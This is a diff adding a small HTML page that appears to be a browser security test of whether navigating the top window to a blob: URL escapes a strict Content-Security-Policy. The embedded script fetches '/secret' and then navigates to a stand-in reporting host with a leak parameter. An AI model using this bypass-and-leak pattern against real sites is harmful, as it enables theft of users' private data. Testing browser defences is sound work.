@@ -1,0 +1,23 @@
+<html>
+  <head>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'">
+  </head>
+  <body>
+    <script>
+      const blobContent = `
+        <html>
+          <body>
+            <script>
+              fetch('/secret').then(response => response.text()).then(secret => {
+                alert(secret);
+                location.href = 'https://a.test/report/?leak=c1115628';
+              });
+            <\/script>
+          </body>
+        </html>`;
+      const blob = new Blob([blobContent], { type: 'text/html' });
+      const blobURL = URL.createObjectURL(blob);
+      window.top.location = blobURL;
+    </script>
+  </body>
+</html>
